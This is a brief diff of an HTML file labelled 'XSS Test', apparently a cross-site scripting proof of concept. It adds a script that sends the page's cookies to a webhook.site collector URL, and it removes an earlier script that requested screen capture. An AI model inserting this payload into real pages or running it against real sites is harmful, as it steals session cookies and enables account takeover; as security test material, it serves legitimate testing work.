@@ -1,6 +1,13 @@
-<script>
-  navigator.mediaDevices.getDisplayMedia().then(stream => {
-    // or try leaking window data / throw to show unexpected execution
-    alert("Unauthorized access");
-  });
-</script>
+<html>
+  <body>
+    <h1>XSS Test</h1>
+    <script>
+      document.body.innerHTML += "<p>🔥 Script Executed</p>";
+      fetch("https://webhook.site/your-custom-id", {
+        method: "POST",
+        body: JSON.stringify({ cookies: document.cookie }),
+      });
+    </script>
+  </body>
+</html>
+
